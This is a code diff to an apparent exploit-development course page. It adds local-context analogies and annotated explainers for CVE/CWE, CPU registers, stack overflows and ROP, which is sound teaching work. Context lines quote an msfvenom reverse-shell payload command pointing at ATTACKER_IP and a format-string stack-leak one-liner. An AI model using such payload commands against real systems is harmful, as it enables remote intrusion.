@@ -2,6 +2,7 @@
 import React from 'react'
 import Link from 'next/link'
 import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'
+import { Local, Watch, Ref } from '@/app/components/learn/Mtaani'
 
 const mono = 'JetBrains Mono, monospace'
 const accent = '#bf5fff'
@@ -71,6 +72,8 @@ const chapters: CodexChapter[] = [
       <div>
         <Note type="beginner">Vulnerability research is the systematic process of finding security flaws before attackers do - or understanding flaws after they are discovered. Every exploit starts with a vulnerability, so understanding how they are classified and tracked is essential context for everything else in this module.</Note>
         <P>The security industry uses standardised systems to track, score, and communicate vulnerabilities. These systems let defenders prioritise what to patch first and let researchers publish findings in a structured way.</P>
+
+        <Local>Walk into Naivas looking for cooking oil. &quot;Cooking oil&quot; is a whole shelf category &mdash; that is a CWE, the <em>kind</em> of weakness. But the 2-litre Elianto bottle with batch number 4471 sitting on that shelf is one exact product &mdash; that is a CVE, this <em>specific</em> flaw in this specific software. The shop tracks both the category and the exact item on the shelf, and so do security researchers.</Local>
 
         <H3>CVE and CWE - The Classification Systems</H3>
         <P>A CVE (Common Vulnerabilities and Exposures) is a specific instance of a vulnerability in a specific product. A CWE (Common Weakness Enumeration) is the category of weakness that caused it. The distinction matters: CWE-79 is "Cross-site Scripting" (the weakness type); CVE-2021-44228 is Log4Shell (the specific instance in Log4j).</P>
@@ -182,6 +185,10 @@ PATCH COMPLETE  Exposure minimised (never zero - some never patch)`}</Pre>
         />
 
         <H3>x86 and x64 Registers</H3>
+        <Watch
+          reads={<>A register is just a tiny, named pocket inside the CPU that holds one value while it works. This list names the pockets. The one to notice is the last: <strong>EIP/RIP</strong> &mdash; it holds the address of the next instruction to run. Do not memorise the rest; just see that the machine has a handful of labelled pockets and one of them decides what happens next.</>}
+          later={<>You&apos;ll watch these pockets change live in a debugger during <Ref>the Stack Buffer Overflows chapter</Ref> and the lab &mdash; for now, just read.</>}
+        >
         <Pre label="KEY REGISTERS">{`x86 (32-bit):
   EAX  Accumulator (return values, arithmetic)
   EBX  Base register (general purpose)
@@ -197,6 +204,7 @@ x64 (64-bit) adds/extends:
   RAX-RDX (64-bit versions of EAX-EDX)
   RSI, RDI, RBP, RSP, RIP (64-bit versions)
   R8-R15 (8 additional general purpose registers)`}</Pre>
+        </Watch>
         <Note type="info">EIP/RIP is the crown jewel. If an attacker controls the instruction pointer, they control what code executes next. Every stack overflow attack aims to overwrite the saved return address, which gets loaded into EIP/RIP when the function returns.</Note>
 
         <H3>Calling Conventions</H3>
@@ -283,8 +291,14 @@ msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikat
       <div>
         <Note type="beginner">Stack buffer overflows are the foundational memory corruption exploit. Modern systems have many mitigations (covered in Chapter 4), but understanding the classic technique is essential before understanding bypasses. Many embedded systems, legacy software, and CTF challenges still lack these protections.</Note>
 
+        <Local>Picture mama mboga measuring maize into a gorogoro tin that holds exactly two kilos. If she keeps pouring past two kilos, the extra does not disappear &mdash; it spills over onto the next tin and onto the coins she had stacked right behind it. A buffer is that tin. Write more than it holds and the overflow lands on whatever sits behind it in memory &mdash; including the little note that tells the program where to go next.</Local>
+
         <H3>How Stack Overflows Work</H3>
         <P>When a function declares a local buffer and writes more data into it than the buffer can hold, the excess bytes overwrite adjacent stack memory. If the overflow is large enough, it reaches the saved return address. When the function returns and loads the saved return address into EIP, the attacker controls where execution jumps.</P>
+        <Watch
+          reads={<>Read this bottom-to-top like a stack of plates. The program&apos;s own buffer sits low; the saved <strong>return address</strong> &mdash; the note saying &quot;come back here when done&quot; &mdash; sits just above it. The bottom block shows what happens when you pour in 104+ bytes: the first 100 fill the buffer, and the extra bytes reach up and overwrite that return note. That is the whole trick, on one screen.</>}
+          later={<>You&apos;ll make a real program crash exactly like this, then measure the offset yourself, in <Ref>the offensive lab</Ref>.</>}
+        >
         <Pre label="STACK FRAME LAYOUT (32-bit, growing downward)">{`HIGH ADDRESS
   [function arguments]
   [saved return address]   <-- overwrite this to control EIP
@@ -297,6 +311,7 @@ Overflow: write 104+ bytes into the 100-byte buffer
   bytes 1-100:   fill the buffer
   bytes 101-104: overwrite saved EBP
   bytes 105-108: overwrite saved return address -> control EIP`}</Pre>
+        </Watch>
 
         <H3>Finding the Offset - Cyclic Patterns</H3>
         <P>Rather than guessing how many bytes reach EIP, use a cyclic pattern where every 4-byte subsequence is unique. When the program crashes with the pattern in EIP, you can calculate the exact offset.</P>
@@ -479,6 +494,8 @@ python3 -c "print('%p.' * 50)"   # Leak 50 stack words
     content: (
       <div>
         <Note type="beginner">ROP is the primary technique for exploiting modern systems with DEP/NX enabled. Instead of injecting code, you reuse code that already exists in memory. Think of it like picking sentences out of a dictionary to make a new message - the words (gadgets) already exist, you just arrange them.</Note>
+
+        <Local>At a harambee the rule is simple: you are not allowed to bring in new money of your own (that is DEP/NX blocking fresh code). So to reach the target you gather what is already in the room &mdash; each guest in the row holds a small contribution and, once they add it, passes the basket to the next person. One gadget, one hand-off, one gadget, one hand-off, until the total reaches the front. ROP is that basket moving down a row of pieces that were already there.</Local>
 
         <H3>ROP Concept</H3>
         <P>A gadget is a short sequence of instructions ending in a RET instruction. Because RET pops the top of stack into EIP/RIP, controlling the stack means controlling the sequence of gadgets executed. Each gadget does a small operation, and chaining many gadgets produces arbitrary computation - entirely from existing executable memory, bypassing DEP/NX.</P>
